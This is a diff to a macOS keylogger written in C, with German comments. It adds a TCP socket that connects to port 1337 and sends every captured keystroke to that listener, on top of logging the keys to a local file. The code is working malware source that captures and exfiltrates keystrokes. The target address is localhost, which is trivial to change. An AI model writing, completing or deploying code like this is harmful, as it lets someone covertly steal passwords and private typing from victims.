@@ -1,14 +1,43 @@
-#include <stdio.h>
+#include <sys/types.h>    // für socket()
+#include <sys/socket.h>   // für socket()
+#include <netinet/in.h>   // für socket()
+#include <assert.h>       // für assert()
+#include <netdb.h>        // für getprotobyname()
+#include <unistd.h>       // für close()
+#include <arpa/inet.h>    //für inet_ntop()
+#include <netdb.h>        //für getaddrinfo()
+#include <string.h>         // für memset()
+#include <stdio.h> 
+#include <errno.h>
+#include <unistd.h>
+#include <stdlib.h>
 #include <time.h>
 #include <ApplicationServices/ApplicationServices.h> /* ApplicationServices.framework needed */
 
 FILE *logFile = NULL;
 int counter = 0;
-
+int socks = 0;
 char* keyCodeToReadableString (CGKeyCode);
 CGEventRef myCGEventCallback (CGEventTapProxy, CGEventType, CGEventRef, void *);
 
 int main (int argc, const char * argv[]) {
+    
+    
+    /* Socket erstellen */
+    socks = socket(AF_INET, SOCK_STREAM, 0);
+ 
+    /* Verbindungsziel festlegen, Port und IP-Adresse des Servers angeben */
+    struct sockaddr_in serveraddr;
+    bzero(&serveraddr, sizeof(serveraddr));
+    inet_pton(AF_INET, "127.0.0.1", &(serveraddr.sin_addr));
+    serveraddr.sin_family = AF_INET;
+    serveraddr.sin_port = htons(1337);
+
+    
+    /* Verbindung aufbauen */
+    connect(socks, (struct sockaddr*) &serveraddr, sizeof(serveraddr));
+
+    
   CGEventFlags oldFlags = CGEventSourceFlagsState(kCGEventSourceStateCombinedSessionState);
 
   CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
@@ -23,7 +52,7 @@ int main (int argc, const char * argv[]) {
   CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
   CGEventTapEnable(eventTap, true);
   
-  logFile = fopen("/var/log/keystroke.log", "a");
+  logFile = fopen("./keystroke.log", "a");
   CFRunLoopRun();
   
   return 0;
@@ -37,22 +66,21 @@ CGEventRef myCGEventCallback (CGEventTapProxy proxy, CGEventType type, CGEventRe
   
   counter++;
   CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
-  
   if (logFile) {
     time_t currentTime;
     time(&currentTime);
     struct tm *time_info = localtime(&currentTime);
     
-    char fmtTime[32];
-    strftime(fmtTime, 32, "%F %T", time_info);
+     char msg[100];
+     strncpy(msg, keyCodeToReadableString(keyCode), 100);
+     send(socks , msg, sizeof(msg), 0);
+    fprintf(logFile, "%s\n", keyCodeToReadableString(keyCode));
     
-    fprintf(logFile, "%s %s\n", fmtTime, keyCodeToReadableString(keyCode));
-    
-    if (counter % 100 == 0) fflush(logFile);
+    //if (counter % 100 == 0) 
+    fflush(logFile);
   }
   return event;
 }
-
 
 char* keyCodeToReadableString (CGKeyCode keyCode) {
   switch ((int) keyCode) {
